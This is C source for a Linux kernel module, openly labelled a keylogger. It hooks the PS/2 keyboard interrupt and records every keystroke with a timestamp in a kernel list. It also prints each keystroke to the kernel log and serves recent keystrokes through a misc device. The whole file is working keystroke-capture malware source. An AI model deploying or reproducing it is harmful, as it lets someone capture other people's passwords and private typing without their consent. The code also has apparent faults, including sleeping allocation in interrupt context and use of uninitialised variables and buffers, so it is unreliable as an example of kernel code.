// SPDX-License-Identifier: GPL-2.0+
#include "keylogger.h"


DEFINE_MUTEX(keyboard_mutex);
DEFINE_SPINLOCK(keyboard_spinlock);
LIST_HEAD(keypress_list);

static struct key_press keys;


static u8 scancodes[CB_SIZE] = {0x0};
static int windex = -1;
static int rindex = -1;
static size_t list_size = 0;

// helpers
static int is_key_pressed(unsigned int scancode)
{
	return !(scancode & RELEASED_MASK);
}

static const struct scan_code codes[] = {
	{0x0, "NULL"},
	{0x1, "Escape"},
	{0x2, "1"},
	{0x3, "2"},
	{0x4, "3"},
	{0x5, "4"},
	{0x6, "5"},
	{0x7, "6"},
	{0x8, "7"},
	{0x9, "8"},
	{0xa, "9"},
	{0xb, "0 Zero"},
	{0xc, "-"},
	{0xd, "="},
	{0xe, "Backspace"},
	{0xf, "Tab"},
	{0x10, "q"},
	{0x11, "w"},
	{0x12, "e"},
	{0x13, "r"},
	{0x14, "t"},
	{0x15, "y"},
	{0x16, "u"},
	{0x17, "i"},
	{0x18, "o"},
	{0x19, "p"},
	{0x1e, "a"},
	{0x1f, "s"},
	{0x20, "d"},
	{0x21, "f"},
	{0x22, "g"},
	{0x23, "h"},
	{0x24, "j"},
	{0x25, "k"},
	{0x26, "l"},
	{0x27, ";"},
	{0x28, "' (Single quote)"},
	{0x29, "` (Back tick)"},
	{0x2a, "Left shift"},
	{0x2b, "\\"},
	{0x2c, "z"},
	{0x2d, "x"},
	{0x2e, "c"},
	{0x2f, "v"},
	{0x30, "b"},
	{0x31, "n"},
	{0x32, "m"},
	{0x33, ","},
	{0x34, "."},
	{0x35, "/"},
	{0x36, "Right shift"},
	{0x37, "(Keypad) *"},
	{0x38, "Left alt"},
	{0x39, "Space"},
	{0x3a, "CapsLock"},
	{0x3b, "F1"},
	{0x3c, "F2"},
	{0x3d, "F3"},
	{0x3e, "F4"},
	{0x3f, "F5"},
	{0x40, "F6"},
	{0x41, "F7"},
	{0x42, "F8"},
	{0x43, "F9"},
	{0x44, "F10"},
	{0x45, "NumberLock"},
	{0x46, "ScrollLock"},
	{0x47, "(Keypad) 7"},
	{0x48, "(Keypad) 8"},
	{0x49, "(Keypad) 9"},
	{0x4a, "(Keypad) -"},
	{0x4b, "(Keypad) 4"},
	{0x4c, "(Keypad) 5"},
	{0x4d, "(Keypad) 6"},
	{0x4e, "(Keypad) +"},
	{0x4f, "(Keypad) 1"},
	{0x50, "(Keypad) 2"},
	{0x51, "(Keypad) 3"},
	{0x52, "(Keypad) 0"},
	{0x53, "(Keypad) ."},
	{0x57, "F11"},
	{0x58, "F12"},
	{0x1c, "Enter"},
};

// misc ops
static ssize_t misc_read(struct file *filp, char __user *buffer,
				size_t length, loff_t *offset)
{
	ssize_t		retval = 0;
	size_t		count = 0;
	size_t		s;
	char		*klg_buffer = filp->private_data;

	s = strlen(klg_buffer);
	if (s == 0) {
		retval = -ENODATA;
		goto out;
	}

	if (*offset == s)
		goto out;

	if (*offset + length > s)
		count = s - *offset;
	if (length < s)
		count = length;
	else
		count = s;

	if ((copy_to_user(buffer, &klg_buffer[*offset], count))) {
		retval = -EFAULT;
		goto out;
	}
	*offset += count;
	return count;

out :
	return retval;
}

static int misc_open(struct inode *inode, struct file *filp)
{
	char			*buffer;
	char			proto[60] = {0};
	int			index = 0;
	int			written;
	struct key_press	*tmp, *next;

	buffer = kmalloc(sizeof(char) * (MISC_SIZE * 45), GFP_KERNEL);
	if (!buffer)
		return -ENOMEM;
	spin_lock(&keyboard_spinlock);
	list_for_each_entry_safe(tmp, next, &keypress_list, list) {
		if (index >= (int)list_size - MISC_SIZE) {
			written = sprintf(proto, "[%02d:%02d:%02d] (0x%02X) %s %s\n", 
						tmp->tm.tm_hour,
						tmp->tm.tm_min,
						tmp->tm.tm_sec,
						tmp->scancode,
						tmp->status ? "pressed" : "released",
						tmp->name
						);
		}
		strncat(buffer, proto, written);
		index++;
	}
	spin_unlock(&keyboard_spinlock);
	filp->private_data = buffer;
	return 0;
}

static int misc_release(struct inode *inode, struct file *filp)
{
	kfree(filp->private_data);
	return 0;
}

static const struct file_operations fops = {
	.read		= misc_read,
	.open		= misc_open,
	.release	= misc_release
};

static struct miscdevice keyboard_device = {
	.minor		= MISC_DYNAMIC_MINOR,
	.name		= "valmpani-keyboard",
	.fops		= &fops,
};

// irq section

static int get_code_index(u8 scancode)
{
	for (int i = 0; i < 83; i++) {
		if (codes[i].scancode == scancode)
			return i;
	}
	return -1;
}

static struct tm get_current_time(void)
{
	struct timespec64 ts;
	struct tm tm;

	ktime_get_real_ts64(&ts); // Get the current time in seconds since the epoch
	time64_to_tm(ts.tv_sec, 0, &tm); // Convert to broken-down time
	tm.tm_hour = (tm.tm_hour + 2) % 24;
	return tm;
}

static int add_keypress_to_list(int index, int status, struct tm tm)
{
	struct key_press *keypress;
	
	keypress = kmalloc(sizeof(struct key_press), GFP_KERNEL);	
	if (!keypress)
		return -ENOMEM;
	keypress->name = codes[index].name;
	keypress->scancode = codes[index].scancode;
	keypress->status = status;
	keypress->tm = tm;
	mutex_lock(&keyboard_mutex);
	list_add_tail(&keypress->list, &keypress_list);
	list_size++;
	mutex_unlock(&keyboard_mutex);
	return 0;
}

static void perform_task(struct tasklet_struct *task)
{
	u8		scancode;
	u8		temp_sc;
	int		index;
	int		pressed;
	unsigned long	flags;
	struct tm	tm;
	
	spin_lock_irqsave(&keyboard_spinlock, flags);
	if (rindex + 1 == CB_SIZE)
		rindex = 0;
	scancode = scancodes[++rindex];
	pressed	= is_key_pressed(scancode);
	temp_sc = pressed ? scancode : (scancode - 0x80);
	index = get_code_index(temp_sc);
	if (index == -1)
		goto out;
	struct scan_code code = codes[index];
	tm = get_current_time();
	if (add_keypress_to_list(index, pressed, tm))
		goto out;
	pr_info("[%02d:%02d:%02d] (0x%02X) %s %s\n",
			tm.tm_hour,
			tm.tm_min,
			tm.tm_sec,
			scancode,
			pressed == 1 ? "pressed " : "released",
			code.name
			);

out:
	spin_unlock_irqrestore(&keyboard_spinlock, flags);
	return ;
}

DECLARE_TASKLET(keylogger_task, perform_task);

static irqreturn_t keyboard_handler(int irq, void *dev_id)
{
	u8		scancode = inb(KEYBOARD_PORT);
	unsigned long	flags;

	spin_lock_irqsave(&keyboard_spinlock, flags);
	if (windex + 2 == CB_SIZE)
		windex = 0;
	scancodes[++windex] = scancode;
	spin_unlock_irqrestore(&keyboard_spinlock, flags);
	tasklet_schedule(&keylogger_task);

	return IRQ_HANDLED;
}

static int driver_irq_reg(void)
{
	int ret;
	ret = request_irq(PL2_IRQ, &keyboard_handler, IRQF_SHARED, "Keyloggerrrrr", &keys);
	if (ret < 0) {
		pr_err("Failed to register interrupt request handler\n");
		return ret;
	}
	pr_info("Return value %d\n", ret);
	return 0;
}

static void driver_irq_unregister(void)
{
	struct key_press *temp, *next;

	free_irq(PL2_IRQ, &keys);
	list_for_each_entry_safe(temp, next, &keypress_list, list) {
		list_del(&temp->list);
		kfree(temp);
	}
}


static int __init main(void)
{
	int err;

	err = driver_irq_reg();
	if (err) {
		pr_err("IRQ failed\n");
		return -EFAULT;
	}
	misc_register(&keyboard_device);
	return 0;
}

static void __exit cleanup(void)
{
	driver_irq_unregister();
	misc_deregister(&keyboard_device);
	pr_info("cleanup\n");
}

MODULE_AUTHOR("valmpanis");
MODULE_DESCRIPTION("Keylogger");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

module_init(main);

module_exit(cleanup);
